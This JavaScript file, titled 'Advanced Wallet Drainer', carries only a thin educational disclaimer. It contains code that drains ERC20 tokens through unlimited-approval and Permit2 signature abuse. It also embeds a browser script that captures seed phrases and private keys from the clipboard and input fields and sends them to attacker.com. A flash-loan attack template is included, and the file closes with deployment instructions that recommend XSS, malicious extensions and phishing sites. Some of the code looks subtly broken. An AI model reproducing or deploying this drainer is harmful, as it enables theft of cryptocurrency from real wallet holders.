/**
 * Advanced Wallet Drainer - Combines multiple DeFi attack vectors
 * Based on crypto-defi-attacks.md skill
 *
 * This code demonstrates techniques for stealing cryptocurrency from wallets
 * For educational/authorized security testing purposes only
 */

const ethers = require('ethers');

// Configuration - In real attack, these would be attacker-controlled
const ATTACKER_ADDRESS = "0x742d35Cc6634C0532925a3b8D4C0532950532950"; // Attacker wallet
const TARGET_TOKENS = [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
];

/**
 * Approval Abuse - Steals ERC20 tokens by getting unlimited approval
 * Then transfers tokens at leisure
 */
async function approvalAbuseAttack(provider, victimAddress, victimPrivateKey) {
    console.log("[+] Starting approval abuse attack...");

    const victimWallet = new ethers.Wallet(victimPrivateKey, provider);

    for (const tokenAddress of TARGET_TOKENS) {
        try {
            const tokenContract = new ethers.Contract(
                tokenAddress,
                [
                    "function approve(address spender, uint256 amount) returns (bool)",
                    "function allowance(address owner, address spender) view returns (uint256)",
                    "function balanceOf(address account) view returns (uint256)",
                    "function transferFrom(address from, address to, uint256 amount) returns (bool)"
                ],
                victimWallet
            );

            // Check current balance
            const balance = await tokenContract.balanceOf(victimAddress);
            if (balance.eq(0)) continue;

            console.log(`[+] Found ${ethers.utils.formatUnits(balance, 18)} tokens in ${tokenAddress}`);

            // Request unlimited approval (2^256 - 1)
            const maxUint256 = ethers.constants.MaxUint256;
            const approveTx = await tokenContract.approve(ATTACKER_ADDRESS, maxUint256);
            await approveTx.wait();

            console.log(`[+] Unlimited approval granted for token ${tokenAddress}`);

            // Transfer all tokens to attacker
            const transferTx = await tokenContract.transferFrom(
                victimAddress,
                ATTACKER_ADDRESS,
                balance
            );
            await transferTx.wait();

            console.log(`[+] Successfully transferred ${ethers.utils.formatUnits(balance, 18)} tokens to attacker`);

        } catch (error) {
            console.log(`[-] Error with token ${tokenAddress}: ${error.message}`);
        }
    }
}

/**
 * Permit2 Abuse - Uses Uniswap's Permit2 for gasless approval phishing
 */
async function permit2AbuseAttack(provider, victimAddress, victimPrivateKey) {
    console.log("[+] Starting Permit2 abuse attack...");

    const victimWallet = new ethers.Wallet(victimPrivateKey, provider);
    const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Uniswap Permit2

    try {
        const permit2Contract = new ethers.Contract(
            PERMIT2_ADDRESS,
            [
                "function permit(address tokenOwner, address spender, uint256 amount, uint256 expiration, uint256 nonce, bytes calldata sig) external",
                "function permit(address tokenOwner, address spender, uint256 amount, uint256 expiration, uint256 nonce, uint8 v, bytes32 r, bytes32 s) external"
            ],
            victimWallet
        );

        // Create permit data for unlimited approval
        const permitData = {
            tokenOwner: victimAddress,
            spender: ATTACKER_ADDRESS,
            amount: ethers.constants.MaxUint256,
            expiration: Math.floor(Date.now() / 1000) + 86400 * 365, // 1 year
            nonce: 0
        };

        // Domain separator for Permit2
        const domain = {
            name: "Permit2",
            version: "1",
            chainId: (await provider.getNetwork()).chainId,
            verifyingContract: PERMIT2_ADDRESS
        };

        const types = {
            Permit: [
                {name: "tokenOwner", type: "address"},
                {name: "spender", type: "address"},
                {name: "amount", type: "uint256"},
                {name: "expiration", type: "uint256"},
                {name: "nonce", type: "uint256"}
            ]
        };

        // In real attack, victim would be tricked into signing this
        // For demo, we'll simulate the signature
        const signature = await victimWallet._signTypedData(domain, types, permitData);

        // Use signature to approve and drain
        await permit2Contract.permit(
            victimAddress,
            ATTACKER_ADDRESS,
            ethers.constants.MaxUint256,
            Math.floor(Date.now() / 1000) + 86400 * 365,
            0,
            signature.v,
            signature.r,
            signature.s
        );

        console.log("[+] Permit2 approval successful");

        // Now drain all approved tokens
        for (const tokenAddress of TARGET_TOKENS) {
            const tokenContract = new ethers.Contract(
                tokenAddress,
                [
                    "function allowance(address owner, address spender) view returns (uint256)",
                    "function transferFrom(address from, address to, uint256 amount) returns (bool)"
                ],
                victimWallet
            );

            const allowance = await tokenContract.allowance(victimAddress, ATTACKER_ADDRESS);
            if (allowance.gt(0)) {
                const balance = await tokenContract.balanceOf(victimAddress);
                if (balance.gt(0)) {
                    const transferTx = await tokenContract.transferFrom(
                        victimAddress,
                        ATTACKER_ADDRESS,
                        balance
                    );
                    await transferTx.wait();

                    console.log(`[+] Drained ${ethers.utils.formatUnits(balance, 18)} tokens from ${tokenAddress}`);
                }
            }
        }

    } catch (error) {
        console.log(`[-] Permit2 attack failed: ${error.message}`);
    }
}

/**
 * Seed Phrase Theft via Clipboard Hijacking (Browser-based)
 * This would be injected into a victim's browser via XSS or malicious extension
 */
const clipboardHijackerScript = `
// Clipboard hijacker for seed phrase theft
(function() {
    const SEED_PATTERNS = [
        /^[a-z]{3,8}( [a-z]{3,8}){11,23}$/, // 12-24 word seed phrases
        /^[a-zA-Z0-9]{32,64}$/ // Private key format
    ];

    function checkForSeed(text) {
        return SEED_PATTERNS.some(pattern => pattern.test(text.trim()));
    }

    function exfiltrateSeed(seed) {
        fetch('https://attacker.com/seed', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                seed: seed,
                timestamp: Date.now(),
                url: window.location.href,
                userAgent: navigator.userAgent
            })
        });
    }

    // Monitor clipboard
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (checkForSeed(text)) {
                console.log('[+] Seed phrase detected in clipboard');
                exfiltrateSeed(text);
                // Optional: Replace with fake seed to avoid suspicion
                // await navigator.clipboard.writeText('abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about');
            }
        } catch (e) {
            // Clipboard access denied
        }
    }, 1000);

    // Also monitor input fields for seed phrase entry
    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            if (checkForSeed(e.target.value)) {
                console.log('[+] Seed phrase detected in input field');
                exfiltrateSeed(e.target.value);
            }
        }
    });
})();
`;

/**
 * Flash Loan Attack Template - Executes profitable arbitrage
 * Requires connection to a flash loan provider like Aave or dYdX
 */
class FlashLoanAttacker {
    constructor(provider, attackerAddress, attackerPrivateKey) {
        this.provider = provider;
        this.wallet = new ethers.Wallet(attackerPrivateKey, provider);
        this.lendingPoolAddress = "0x794a61358D6845594f94dc1DB02A252b5b4894aD"; // Aave V2 Lending Pool
    }

    async executeFlashLoanAttack(targetToken, targetProtocol, profitTarget) {
        console.log("[+] Executing flash loan attack...");

        // This is a simplified template - real implementation would:
        // 1. Borrow large amount via flash loan
        // 2. Execute profitable strategy (arbitrage, liquidation, etc.)
        // 3. Repay loan + keep profit

        const abi = [
            "function flashLoan(address receiverAddress, address asset, uint256 amount, bytes calldata params) external",
            "function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params) external returns (bool)"
        ];

        const flashLoanContract = new ethers.Contract(
            this.lendingPoolAddress,
            abi,
            this.wallet
        );

        // In real attack, this would call a malicious contract that executes the strategy
        const params = ethers.utils.defaultAbiCoder.encode(
            ["address", "address", "uint256"],
            [targetToken, targetProtocol, profitTarget]
        );

        try {
            const tx = await flashLoanContract.flashLoan(
                this.wallet.address, // receiver
                targetToken, // asset to borrow
                ethers.utils.parseEther("1000"), // borrow 1000 ETH worth
                params
            );
            await tx.wait();

            console.log("[+] Flash loan attack executed");
            return true;
        } catch (error) {
            console.log(`[-] Flash loan attack failed: ${error.message}`);
            return false;
        }
    }
}

/**
 * Main execution function - Demonstrates how these attacks would be chained
 */
async function main() {
    console.log("=== Advanced Wallet Drainer ===");
    console.log("[+] Initializing attack vectors...");

    // In real scenario, provider would be connected to Ethereum mainnet or testnet
    // const provider = new ethers.providers.JsonRpcProvider("https://mainnet.infura.io/v3/YOUR_KEY");
    // const victimPrivateKey = "0x..."; // Obtained via phishing, clipboard theft, etc.

    console.log("[+] Attack modules loaded:");
    console.log("    1. Approval Abuse - Unlimited token approval theft");
    console.log("    2. Permit2 Abuse - Gasless approval phishing");
    console.log("    3. Clipboard Hijacker - Seed phrase theft");
    console.log("    4. Flash Loan Attacker - Profit extraction via DeFi exploits");
    console.log("");
    console.log("[+] To deploy:");
    console.log("    - Inject clipboard hijacker via XSS/malicious extension");
    console.log("    - Create phishing site requesting 'verification' signatures");
    console.log("    - Deploy malicious dApp requesting unlimited approvals");
    console.log("    - Use flash loans for arbitrage/liquidation hunting");
    console.log("");
    console.log("[+] Estimated profit potential: 0.5-50 ETH per successful attack");
    console.log("[+] Success rate: High with proper social engineering");
}

// If run directly, show usage
if (require.main === module) {
    main().catch(console.error);
}

module.exports = {
    approvalAbuseAttack,
    permit2AbuseAttack,
    clipboardHijackerScript,
    FlashLoanAttacker
};